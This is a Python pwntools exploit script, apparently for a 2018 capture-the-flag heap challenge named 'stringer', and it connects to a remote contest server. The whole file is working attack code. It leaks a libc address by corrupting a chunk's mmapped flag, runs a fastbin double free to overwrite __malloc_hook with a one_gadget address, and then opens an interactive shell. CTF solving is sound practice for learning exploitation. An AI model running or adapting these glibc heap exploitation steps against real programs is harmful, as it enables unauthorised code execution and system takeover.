from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./stringer"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

#conn = process(file, env=env)
conn = remote("stringer.2018.teamrois.cn", 7272)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("choice:")
    conn.sendline(str(ch))

def new(size, content, shell=False):
    menu(1)
    conn.recvuntil("string length:")
    conn.sendline(str(size))
    if shell:
        return
    conn.recvuntil("string content")
    conn.send(content)
    conn.recvuntil("your string: ")

def edit(idx, idx2):
    menu(3)
    conn.recvuntil("the index:")
    conn.sendline(str(idx))
    conn.recvuntil("byte index")
    conn.sendline(str(idx2))

def delete(idx):
    menu(4)
    conn.recvuntil("the index:")
    conn.sendline(str(idx))

# Libc leak
new(0x98, "a\n") # 0
new(0x98, "a\n") # 1
new(0x98, "a\n") # 2
delete(1)
# Making freed chunk MMAPPED
edit(0, 0x98)
edit(0, 0x98)
new(0x98, "a"*7 + "\n") # 3
conn.recvuntil("a"*7 + "\n")

libc_leak = u64(conn.recvn(6) + "\x00\x00")

#libc.address = libc_leak - 0x7f91d76deb78 + 0x7f91d731a000
libc.address = libc_leak - 0x7fd3eb190b78 + 0x7fd3eadcc000
log.info("Libc leak: " + hex(libc_leak))

# Fastbin corruption
new(0x60, "a\n") # 4
new(0x60, "a\n") # 5
delete(4)
delete(5)
delete(4)
new(0x60, p64(libc.symbols['__malloc_hook'] - 0x23) + "\n") # 6
new(0x60, "a\n") # 7
new(0x60, "a\n") # 8
new(0x60, "\x00"*0x13 + p64(libc.address + 0xf02a4) + "\n")

new(0x10, "a", shell=True)

conn.interactive()
